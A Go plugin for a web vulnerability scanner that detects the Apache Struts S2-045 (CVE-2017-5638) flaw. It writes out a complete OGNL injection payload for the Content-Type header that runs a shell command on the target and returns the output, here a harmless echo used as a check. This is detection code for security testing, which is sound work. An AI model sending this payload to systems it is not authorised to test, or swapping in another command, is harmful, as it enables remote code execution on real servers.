/**
* @Author: shaochuyu
* @Date: 5/7/2022 11:30
 */
package struts

import (
	"context"
	"strconv"
	"strings"
	"wscan/core/http"
	"wscan/core/model"
	"wscan/core/plugins/base"
	"wscan/core/utils"
	logger "wscan/core/utils/log"
)

// S2-045: Jakarta Multipart parser OGNL injection via Content-Type header
// CVE-2017-5638 — Critical RCE in Struts 2.3.5 - 2.3.31, 2.5 - 2.5.10
type S045 struct{}

func (*S045) Finger() *base.Finger {
	return &base.Finger{
		CheckAction: func(ctx context.Context, ab *base.Apollo) error {
			flow := ab.GetTargetFlow()
			logger.Debugf("Start detection S2-045, %s", flow.Request.URL())

			r1 := utils.RandInt(1000000, 10000000)
			r2 := utils.RandInt(1000000, 10000000)
			expectedResult := r1 + r2

			// S2-045: OGNL injection via Content-Type header
			// The payload exploits the Jakarta Multipart parser error handling
			// to execute OGNL expressions
			contentType := "%{(#_='multipart/form-data')." +
				"(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." +
				"(#_memberAccess?(#_memberAccess['allowStaticMethodAccess']=true):" +
				"((#container=#context['com.opensymphony.xwork2.ActionContext.container'])." +
				"(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))." +
				"(#ognlUtil.getExcludedPackageNames().clear())." +
				"(#ognlUtil.getExcludedClasses().clear())." +
				"(#context.setMemberAccess(#dm))))." +
				"(#cmd='echo " + strconv.Itoa(expectedResult) + "')." +
				"(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))." +
				"(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd}))." +
				"(#p=new java.lang.ProcessBuilder(#cmds))." +
				"(#p.redirectErrorStream(true))." +
				"(#process=#p.start())." +
				"(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))." +
				"(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))." +
				"(#ros.flush())}"

			req, _ := http.NewRequest("POST", flow.Request.URL().String(), nil)
			req.SetHeader("Content-Type", contentType)
			res, err := ab.HTTPClient.Respond(ctx, req)
			if err != nil {
				return nil
			}

			if strings.Contains(res.Text, strconv.Itoa(expectedResult)) {
				v := ab.NewWebVuln(req, res, nil)
				if v != nil {
					v.SetTargetURL(flow.Request.URL())
					v.Payload = "S2-045 Content-Type OGNL injection"
					ab.OutputVuln(v)
				}
			}
			return nil
		},
		Channel: "web-generic",
		Binding: &model.VulnBinding{
			ID:       "struts/s2-045/default",
			Plugin:   "struts/s2-045",
			Category: "struts/s2-045",
			Severity: model.SeverityCritical,
		},
	}
}
